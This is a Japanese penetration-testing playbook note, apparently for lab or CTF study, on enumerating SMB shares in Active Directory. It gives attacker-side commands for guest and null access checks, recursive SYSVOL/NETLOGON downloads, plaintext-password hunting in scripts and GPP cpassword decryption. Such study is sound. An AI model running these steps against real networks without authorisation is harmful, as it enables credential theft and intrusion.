# SMB列挙

## 匿名・ゲストアクセスの確認

### 着火条件
445 (SMB) が開いている場合。特にWindows AD環境では最初に確認する。

### 観点・着眼点

**先に確認すること — ゲストアカウントの有効状態を確認する**

まず NetExec（`nxc`。NetExec の CLI ラッパー。SMB/WinRM/MSSQL への認証テストを一括で行うツール、ペネトレ用 Linux ディストリ標準搭載）で Guest アカウントが有効かどうかを確認する。

```bash
# [Attacker]
nxc smb [IP] -u 'guest' -p ''
```

| 出力 | 意味 | 次のアクション |
|------|------|--------------|
| `[+] ...\guest:` | Guest アカウント有効 → 認証情報なしで SMB 共有を列挙できる可能性あり | 続けて共有列挙へ |
| `[-] STATUS_ACCOUNT_DISABLED` | Guest 無効 | Null 認証（`-N`）でも試す。ともに失敗なら認証情報が必要 |

**Guest 有効時は `impacket-smbclient`（Impacket スイート同梱、ペネトレ用 Linux ディストリ標準搭載）でも接続できる：**

```bash
# [Attacker]
impacket-smbclient -no-pass guest@[IP]
```

**標準共有と非標準共有を区別する：**

| 標準共有名 | 用途 | 確認優先度 |
|-----------|------|-----------|
| `ADMIN$` | リモート管理 | 低（通常アクセス不可） |
| `C$` | Cドライブ（管理者のみ） | 低（通常アクセス不可） |
| `IPC$` | プロセス間通信 | 低 |
| `NETLOGON` | ログオンスクリプト | **必ず確認**（認証情報が平文で埋め込まれたスクリプトが置かれることがある） |
| `SYSVOL` | グループポリシー・スクリプト | **必ず確認**（GPP 認証情報・スクリプト） |

→ **上記以外の共有名が存在する場合は必ずアクセスを試みる**

### 手順

**共有の一覧を取得（匿名）**
```bash
smbclient -L //[IP] -N
```

**共有の一覧を取得（認証あり）**
```bash
smbclient -L //[IP] -U '[DOMAIN]\[USER]%[PASSWORD]'
```

**非標準共有にアクセスしてファイル一覧を確認**
```bash
smbclient //[IP]/[SHARE_NAME] -N -c "ls"
# または
smbclient //[IP]/[SHARE_NAME] -U '[USER]%[PASSWORD]'
```

**ファイルをダウンロード**
```bash
smbclient //[IP]/[SHARE_NAME] -N -c "get [FILENAME] /tmp/[FILENAME]"
```

## NETLOGON 共有の確認

### 着火条件

NETLOGON 共有が存在し、匿名またはゲストでアクセスできる場合。

### 観点・着眼点

NETLOGON はドメインのログオンスクリプト置き場。管理者が作成した `.bat` / `.ps1` ファイルに**平文パスワードが埋め込まれている**ことがある。特に以下のパターンが頻出：

- `net use` コマンドの `/user:[USER] [PASSWORD]` オプション
- `if %USERNAME%==[USER] ...` 条件付きの認証情報分岐

**着眼点：** スクリプト内の `net use`・`/user:`・`-p`・`-password`・`PASSWORD=` を探す。

### 手順

```bash
# [Attacker] NETLOGON 共有にアクセス
smbclient -N //[IP]/NETLOGON -c "ls"
# または
impacket-smbclient -no-pass guest@[IP]
# → shares で共有一覧 → use NETLOGON → ls → cat [script_name].bat

# ファイルをダウンロードして確認
smbclient -N //[IP]/NETLOGON -c "get [SCRIPT_NAME] /tmp/[SCRIPT_NAME]"
cat /tmp/[SCRIPT_NAME]
```

**取得した認証情報を即確認する：**
```bash
# [Attacker] 取得した認証情報を検証
nxc smb [IP] -u '[USER]' -p '[PASSWORD]'
```

→ 認証情報が取れたら `../02_Initial_Access/Credential_Discovery.md`（スクリプトへの平文パスワード埋め込みパターン）へ

---

## SYSVOL の確認

### 観点・着眼点

SYSVOL に匿名アクセスできる場合、`scripts/` や `Policies/` 配下に：
- `.bat`, `.ps1`, `.vbs` スクリプト → **平文パスワードが含まれることがある**
- グループポリシー設定（GPO） → 設定不備の確認

### 手順

```bash
smbclient -N //[IP]/SYSVOL
smb: \> ls
smb: \> cd [DOMAIN]\scripts\
smb: \> ls
smb: \> get users.bat /tmp/users.bat
```

再帰的にダウンロード：
```bash
smbclient -N //[IP]/SYSVOL -c "recurse ON; prompt OFF; mget *" -D /tmp/sysvol
```

## SYSVOL / Replication 内部のナビゲーション観点

### 着火条件
SYSVOL または Replication 共有（SYSVOL を DFSR でレプリケーションしたもの）にアクセスできた場合。

### 観点・着眼点

**フォルダの優先度と意味：**

| フォルダ | 優先度 | 中身 |
|---------|--------|------|
| `[domain.name]/` （例: `example.local/`） | **必ず降りる** | SYSVOLのGPO構造。ドメイン名と同名のフォルダがルート直下に存在するのが正常 |
| `Policies/` | **必ず降りる** | 各GPOが `{GUID}` フォルダとして存在 |
| `{GUID}/MACHINE/Preferences/` | **必ず確認** | `Groups/Groups.xml` に GPP 認証情報が含まれることがある |
| `{GUID}/MACHINE/Scripts/` | 確認 | ログオン・ログオフスクリプト |
| `scripts/` | 確認 | `.bat` / `.ps1` → 平文パスワードの可能性 |
| `DfsrPrivate/` | スキップ可 | DFSR複製メタデータ（通常は空またはアクセス不可） |

**よくある混乱：**
> ドメイン名と同名のフォルダ（例: `example.local`）が見えても「ドメイン名と同じだから特殊なものか」と迷わない。
> SYSVOLとReplicationでは、ドメイン名と同名のフォルダがルート直下に存在するのが**正常な構造**。その中に `Policies/` や `scripts/` が入っている。必ず降りる。

### 手順

**再帰的に一覧を取得して全体像を把握する（まずこれ）：**
```bash
smbclient //[IP]/[SHARE] -N -c "recurse ON; ls" 2>/dev/null | tee smb_recursive.txt
```

**ファイルを一括取得（候補が絞れたら）：**
```bash
smbclient //[IP]/[SHARE] -N -c "recurse ON; prompt OFF; mget *" -D /tmp/smb_dump
```

**注意点：** 再帰 `ls` の出力には `DfsrPrivate/` のような不要フォルダも混在する。`Policies/` と `scripts/` 配下を中心に見る。

---

## GPP (Group Policy Preferences) 認証情報の取得

### 着火条件
- SYSVOL または Replication 共有に匿名または認証ありでアクセスできた
- `Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml` が存在する

### 観点・着眼点

`Groups.xml` に `cpassword=` 属性が含まれていたら、それは認証情報確定と考えてよい（誰でも即座に復号できる）。

`Groups.xml` 以外にも `Services.xml` / `ScheduledTasks.xml` / `Drives.xml` / `DataSources.xml` / `Printers.xml` が `cpassword` を持つ可能性があるため、SYSVOL 配下は `grep -ril cpassword` で横断的に確認する。

> 原理（なぜ AES 暗号化されていても誰でも復号できるのか・MS14-025 適用後の挙動） → `../06_Concepts/GPP_Credential.md`

### 手順

**Groups.xml のダウンロード：**
```bash
# 共有内を再帰的に確認し、Groups.xml の場所を特定したら
smbclient //[IP]/[SHARE] -N \
  -c "get Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml /tmp/Groups.xml"
```

**cpassword の復号：**
```bash
# gpp-decrypt（ペネトレ用Linuxディストリ標準搭載）
gpp-decrypt '[CPASSWORD_VALUE]'
```

**Groups.xml の読み方：**
```xml
<!-- 重要な属性 -->
<Properties
  userName="DOMAIN\USERNAME"   ← 対象ユーザー名
  cpassword="edBSHOwh..."      ← 復号するとパスワードが得られる
  action="U"                   ← U=Update（既存ユーザーの変更）
/>
```

---

## enum4linux での網羅的な列挙

### 着火条件
445 (SMB) が開いており、ユーザー・グループ・パスワードポリシー等の AD オブジェクト情報を一括取得したい場合。匿名でも実行できるが、認証情報が取れた後の再実行で取得情報が大幅に増える。

### 観点・着眼点（タイミングと使い分け）

**smbclient との使い分け：**

- `smbclient` → 共有の**ファイル内容を操作する**ためのツール
- `enum4linux` → ユーザー・グループ・パスワードポリシーなど**ADオブジェクト情報を一括取得**するためのツール

**使うタイミング：**

- 匿名アクセス時でも実行できるが、取得できる情報量は限られる
- 認証情報が取れた後に `-u` / `-p` オプション付きで実行すると、ユーザーリスト・グループ情報が大幅に増える

```bash
# 匿名
enum4linux -a [IP] | tee enum4linux_anon.txt

# 認証あり（情報量が増える）
enum4linux -a -u '[USER]' -p '[PASSWORD]' [IP] | tee enum4linux_auth.txt
```

ユーザー一覧・グループ・共有・パスワードポリシーを一括取得。

## 刺さらなかったとき

| 観測される症状 | 推定原因 | 代替手段 |
|--------------|---------|---------|
| `nxc smb [IP] -u 'guest' -p ''` で `STATUS_ACCOUNT_DISABLED` | Guest 無効 | Null 認証（`smbclient -L //[IP] -N`）で再試行。両方失敗なら認証情報が必要 → 認証情報取得（`../00_Playbook/Windows_AD_Attack_Flow.md` Step 3）へ戻る |
| `smbclient -N //[IP]` が `NT_STATUS_ACCESS_DENIED` | 匿名・Guest 共に閉じている | enum4linux / `nxc smb` で別プロトコル（RPC）経由を試す |
| 共有が `IPC$` のみ表示される | 匿名で見える共有が実質ない | 認証情報取得後に再列挙する（`-u [USER] -p '[PASSWORD]'`） |
| SMB 署名が必須（`Signing: True`）と表示される | NTLM リレー攻撃が使えない | リレー以外の経路（Kerberos 認証強制 / Coerce 系・Pass-The-Hash）を検討 |
| `OS=[Unix]` / `OS=[Samba x.x.x]` が表示される | 対象は Linux 上の Samba | Windows 想定の SAM/LSA dump 等は適用外。Samba バージョンの CVE を searchsploit で確認 |
| SYSVOL に降りても `Groups.xml` が見つからない | GPP 認証情報未配布 / すでに撤去済み（MS14-025 適用後の慣習） | `Services.xml` / `ScheduledTasks.xml` / `Drives.xml` / `DataSources.xml` / `Printers.xml` も `grep -ril cpassword` で横断確認 |
| GPP の `cpassword` を `gpp-decrypt` で復号しても無効値（空・改行のみ） | パスワードが意図的に空、または既にローテーション済み | 他の SYSVOL 配下スクリプト（`.bat` / `.ps1`）の平文パスワード探索に切替 |

---

## 注意点・落とし穴

- Null 認証（`-N`）が拒否されても、Guest アカウントが有効な場合は `-u 'guest' -p ''` で認証が通ることがある。`nxc smb [IP] -u 'guest' -p ''` で事前に確認すること
- SMB署名が有効（必須）な場合は中間者攻撃（NTLM リレー）は使えない
- ファイルに `.exe` や `.zip` がある場合は必ずダウンロードして内容を確認する（→ バイナリ解析）
- `{GUID}` 形式のフォルダ名は複数存在することがある。すべてのGUID配下を確認すること

### 関連技術
- 前：ポートスキャンで 445 / 139 を発見 → `./Network_Scanning.md`
- 前：AD 攻撃フロー上の現在地確認 → `../00_Playbook/Windows_AD_Attack_Flow.md`
- 後：GPP で認証情報取得 → `../02_Initial_Access/Credential_Discovery.md`（GPPパターン）
- 後：スクリプトに平文パスワード → `../02_Initial_Access/Credential_Discovery.md`
- 後：実行ファイルが取得できた → `../02_Initial_Access/Binary_Analysis.md`
- 後：取得したドキュメント・画像のメタデータ確認 → `./Metadata_Analysis.md`
- 後：認証情報が取得できた → `./LDAP_Enumeration.md` へ進む
